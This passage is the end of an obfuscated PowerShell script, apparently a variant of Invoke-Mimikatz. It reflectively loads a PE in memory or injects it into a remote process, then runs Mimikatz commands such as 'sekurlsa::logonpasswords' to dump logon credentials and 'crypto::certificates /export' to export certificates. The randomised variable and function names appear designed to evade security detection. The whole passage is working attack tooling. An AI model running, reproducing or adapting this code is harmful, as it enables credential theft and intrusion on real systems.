						-and $OOKmGSWV99.ForwarderChain -eq 0 `
						-and $OOKmGSWV99.Name -eq 0 `
						-and $OOKmGSWV99.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}
				$DwjOtqMA99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((teepee ([Int64]$PEInfo.PEHandle) ([Int64]$OOKmGSWV99.Name)))
				$XovgFNfI99 = $GMTlJquq99.GetModuleHandle.Invoke($DwjOtqMA99)
				if ($XovgFNfI99 -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $DwjOtqMA99. Continuing anyways" -WarningAction Continue
				}
				
				$JjRBItJb99 = $GMTlJquq99.FreeLibrary.Invoke($XovgFNfI99)
				if ($JjRBItJb99 -eq $false)
				{
					Write-Warning "Unable to free library: $DwjOtqMA99. Continuing anyways." -WarningAction Continue
				}
				
				$dWDvlOYQ99 = teepee ($dWDvlOYQ99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$wmxAHjcd99.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$etWdKgCw99 = teepee ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$ZDErcYZL99 = rafters @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$VTxCalzZ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($etWdKgCw99, $ZDErcYZL99)
		
		$VTxCalzZ99.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$JjRBItJb99 = $GMTlJquq99.VirtualFree.Invoke($QeodNfcO99, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($JjRBItJb99 -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}
	Function Main
	{
		$GMTlJquq99 = exposing
		$wmxAHjcd99 = whitewashes
		$Win32Constants =  forgathered
		
		$zookRCtG99 = [IntPtr]::Zero
	
		if (($PZySGmiC99 -ne $null) -and ($PZySGmiC99 -ne 0) -and ($MphyBtCW99 -ne $null) -and ($MphyBtCW99 -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($MphyBtCW99 -ne $null -and $MphyBtCW99 -ne "")
		{
			$LhkOeVGv99 = @(Get-Process -Name $MphyBtCW99 -ErrorAction SilentlyContinue)
			if ($LhkOeVGv99.Count -eq 0)
			{
				Throw "Can't find process $MphyBtCW99"
			}
			elseif ($LhkOeVGv99.Count -gt 1)
			{
				$UlipSpmT99 = Get-Process | where { $_.Name -eq $MphyBtCW99 } | Select-Object ProcessName, Id, SessionId
				Write-Output $UlipSpmT99
				Throw "More than one instance of $MphyBtCW99 found, please specify the process ID to inject in to."
			}
			else
			{
				$PZySGmiC99 = $LhkOeVGv99[0].ID
			}
		}
		
		
		if (($PZySGmiC99 -ne $null) -and ($PZySGmiC99 -ne 0))
		{
			$zookRCtG99 = $GMTlJquq99.OpenProcess.Invoke(0x001F0FFF, $false, $PZySGmiC99)
			if ($zookRCtG99 -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $PZySGmiC99"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		
		Write-Verbose "Calling sluicing"
        try
        {
            $ytGPQFyn99 = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }
        if ($ytGPQFyn99 -is [array])
        {
            $UkTQtfqO99 = $ytGPQFyn99[0]
        } else {
            $UkTQtfqO99 = $ytGPQFyn99
        }
        if ( ( $UkTQtfqO99.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $UkTQtfqO99.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$jfneoYUd99 = [Byte[]][Convert]::FromBase64String($UESHwemo99)
        }
        else
        {
            [Byte[]]$jfneoYUd99 = [Byte[]][Convert]::FromBase64String($keDFJErN99)
        }
        $jfneoYUd99[0] = 0
        $jfneoYUd99[1] = 0
		$QeodNfcO99 = [IntPtr]::Zero
		if ($zookRCtG99 -eq [IntPtr]::Zero)
		{
			$JjFbsvwS99 = sluicing -jfneoYUd99 $jfneoYUd99 -gApRtNwy99 $gApRtNwy99
		}
		else
		{
			$JjFbsvwS99 = sluicing -jfneoYUd99 $jfneoYUd99 -gApRtNwy99 $gApRtNwy99 -zookRCtG99 $zookRCtG99
		}
		if ($JjFbsvwS99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$QeodNfcO99 = $JjFbsvwS99[0]
		$iwSssHKF99 = $JjFbsvwS99[1] #only matters if you loaded in to a remote process
		
		
		$PEInfo = watching -QeodNfcO99 $QeodNfcO99 -wmxAHjcd99 $wmxAHjcd99 -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($zookRCtG99 -eq [IntPtr]::Zero))
		{
                    Write-Verbose "Calling function with WString return type"
				    [IntPtr]$vUKgMUCs99 = gentled -QeodNfcO99 $QeodNfcO99 -FunctionName "powershell_reflective_mimikatz"
				    if ($vUKgMUCs99 -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $pztlNBzx99 = rafters @([IntPtr]) ([IntPtr])
				    $SWCFAGfp99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vUKgMUCs99, $pztlNBzx99)
                    $lnnfKupT99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($gApRtNwy99)
				    [IntPtr]$zzgLYiSh99 = $SWCFAGfp99.Invoke($lnnfKupT99)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($lnnfKupT99)
				    if ($zzgLYiSh99 -eq [IntPtr]::Zero)
				    {
				    	Throw "Unable to get output, Output Ptr is NULL"
				    }
				    else
				    {
				        $RYSJQzPW99 = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($zzgLYiSh99)
				        Write-Output $RYSJQzPW99
				        $GMTlJquq99.LocalFree.Invoke($zzgLYiSh99);
				    }
		}
		elseif (($PEInfo.FileType -ieq "DLL") -and ($zookRCtG99 -ne [IntPtr]::Zero))
		{
			$CSydMfVD99 = gentled -QeodNfcO99 $QeodNfcO99 -FunctionName "VoidFunc"
			if (($CSydMfVD99 -eq $null) -or ($CSydMfVD99 -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$CSydMfVD99 = swerving $CSydMfVD99 $QeodNfcO99
			$CSydMfVD99 = teepee $CSydMfVD99 $iwSssHKF99
			
			$rUcofqbc99 = Gainsborough -AWGiTHqY99 $zookRCtG99 -StartAddress $CSydMfVD99 -GMTlJquq99$GMTlJquq99#-
		}
		
		if ($zookRCtG99 -eq [IntPtr]::Zero)
		{
			backslidden -QeodNfcO99 $QeodNfcO99
		}
		else
		{
			$JjRBItJb99 = $GMTlJquq99.VirtualFree.Invoke($QeodNfcO99, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($JjRBItJb99 -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}
	Main
}
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$POyhSCtx99  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	if ($PsCmdlet.ParameterSetName -ieq "DumpCred")
	{
		$gApRtNwy99 = "sekurlsa::logonpasswords exit"
	}
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $gApRtNwy99 = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $gApRtNwy99 = $Command
    }
    [System.IO.Directory]::SetCurrentDirectory($pwd)
	if ($YuhhAJEt99 -eq $null -or $YuhhAJEt99 -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RhGiHIeA99 -ArgumentList @($UESHwemo99, $keDFJErN99, "Void", 0, "", $gApRtNwy99)
	}
	else
	{
		Invoke-Command -ScriptBlock $RhGiHIeA99 -ArgumentList @($UESHwemo99, $keDFJErN99, "Void", 0, "", $gApRtNwy99) -YuhhAJEt99 $YuhhAJEt99
	}
}
Main
}